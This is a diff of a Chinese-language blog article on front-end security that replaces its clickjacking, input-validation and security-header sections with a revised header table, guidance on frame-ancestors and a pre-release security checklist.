-<h3 id="4-3-点击劫持防御"><a href="#4-3-点击劫持防御" class="headerlink" title="4.3 点击劫持防御"></a>4.3 点击劫持防御</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 禁止页面被嵌入到 iframe 中 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-Frame-Options&quot;</span> <span class="attr">content</span>=<span class="string">&quot;DENY&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Nginx 配置 --&gt;</span></span><br><span class="line">add_header X-Frame-Options &quot;SAMEORIGIN&quot; always;</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-4-输入校验"><a href="#4-4-输入校验" class="headerlink" title="4.4 输入校验"></a>4.4 输入校验</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前端校验 + 后端校验（前端校验只是用户体验）</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validateEmail</span>(<span class="params">email</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="regexp">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span>.test(email)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DOMPurify 清理用户输入的 HTML</span></span><br><span class="line"><span class="keyword">import</span> DOMPurify <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span></span><br><span class="line"><span class="keyword">const</span> cleanHtml = DOMPurify.sanitize(userInput)</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="五、安全头速查"><a href="#五、安全头速查" class="headerlink" title="五、安全头速查"></a>五、安全头速查</h2><table>
-<thead>
-<tr>
-<th>头部</th>
-<th>作用</th>
-<th>推荐值</th>
+<th>响应头</th>
+<th>解决的问题</th>
+<th>注意点</th>
 </tr>
 </thead>
 <tbody><tr>
 <td><code>Content-Security-Policy</code></td>
-<td>限制资源来源</td>
-<td><code>default-src &#39;self&#39;</code></td>
+<td>限制脚本、嵌入和资源来源</td>
+<td>先用 Report-Only 验证</td>
 </tr>
 <tr>
-<td><code>X-Content-Type-Options</code></td>
-<td>禁止 MIME 嗅探</td>
-<td><code>nosniff</code></td>
-</tr>
-<tr>
-<td><code>X-Frame-Options</code></td>
-<td>防止点击劫持</td>
-<td><code>DENY</code> 或 <code>SAMEORIGIN</code></td>
-</tr>
-<tr>
-<td><code>Strict-Transport-Security</code></td>
-<td>强制 HTTPS</td>
-<td><code>max-age=31536000</code></td>
+<td><code>X-Content-Type-Options: nosniff</code></td>
+<td>防止 MIME 嗅探</td>
+<td>通常可直接启用</td>
 </tr>
 <tr>
 <td><code>Referrer-Policy</code></td>
-<td>控制 referer 信息</td>
-<td><code>strict-origin-when-cross-origin</code></td>
+<td>减少 URL 中的来源信息泄露</td>
+<td>评估分析与支付回跳</td>
+</tr>
+<tr>
+<td><code>Permissions-Policy</code></td>
+<td>收紧摄像头、定位等能力</td>
+<td>按页面实际需要授权</td>
+</tr>
+<tr>
+<td><code>Strict-Transport-Security</code></td>
+<td>强制后续 HTTPS 访问</td>
+<td>只在全站 HTTPS 后启用</td>
 </tr>
 </tbody></table>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx 安全头配置</span></span><br><span class="line"><span class="attribute">add_header</span> X-Content-Type-Options <span class="string">&quot;nosniff&quot;</span> always;</span><br><span class="line"><span class="attribute">add_header</span> X-Frame-Options <span class="string">&quot;SAMEORIGIN&quot;</span> always;</span><br><span class="line"><span class="attribute">add_header</span> X-XSS-Protection <span class="string">&quot;1; mode=block&quot;</span> always;</span><br><span class="line"><span class="attribute">add_header</span> Referrer-Policy <span class="string">&quot;strict-origin-when-cross-origin&quot;</span> always;</span><br><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubDomains&quot;</span> always;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前端安全核心要点：</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 🛡️ XSS 防护</span></span><br><span class="line"><span class="comment">//   - 转义用户输入（框架默认做）</span></span><br><span class="line"><span class="comment">//   - CSP 策略限制脚本来源</span></span><br><span class="line"><span class="comment">//   - HttpOnly Cookie 保护 session</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 🛡️ CSRF 防护</span></span><br><span class="line"><span class="comment">//   - SameSite Cookie（最佳方案）</span></span><br><span class="line"><span class="comment">//   - CSRF Token</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// 🛡️ 通用实践</span></span><br><span class="line"><span class="comment">//   - 使用 HTTPS</span></span><br><span class="line"><span class="comment">//   - 敏感信息不存 localStorage</span></span><br><span class="line"><span class="comment">//   - 输入校验（但信任后端校验）</span></span><br><span class="line"><span class="comment">//   - 安全头配置</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 最重要的原则：永远不要信任用户的输入</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>推荐阅读：</strong></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/Security">MDN: Web security</a></li>
-<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Frontend_Security_Cheat_Sheet.html">OWASP 前端安全</a></li>
+<p><code>frame-ancestors</code> 是防点击劫持的现代 CSP 指令。旧的 <code>X-Frame-Options</code> 仍可作为兼容补充，但不能通过 <code>&lt;meta&gt;</code> 标签可靠地配置。不要再加入 <code>X-XSS-Protection</code>，现代浏览器通常忽略它，部分旧实现还可能引入意外行为。</p>
+<h2 id="发布前检查"><a href="#发布前检查" class="headerlink" title="发布前检查"></a>发布前检查</h2><ul>
+<li>搜索 <code>v-html</code>、<code>innerHTML</code> 和动态 URL，逐个确认数据来源和净化策略。</li>
+<li>用浏览器开发者工具检查真实响应头与 Cookie 属性，而不是只看配置仓库。</li>
+<li>对写操作测试跨站表单、缺失 CSRF Token 和错误 Origin，确认服务端拒绝它们。</li>
+<li>在 CSP Report-Only 阶段收集并处理违规，确认第三方脚本有明确所有者。</li>
+<li>检查打包后的前端环境变量，确保 API 密钥、私钥和服务端令牌没有进入浏览器。</li>
 </ul>
+<p>安全不是在页面末尾补一段代码。把信任边界、会话策略和发布检查写进开发流程，能比一张“安全头速查表”更早发现问题。</p>
+<p><strong>推荐阅读：</strong> <a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP：XSS 防护速查表</a></p>
 </div>
     
       <footer class="post-tags" aria-label="文章标签">
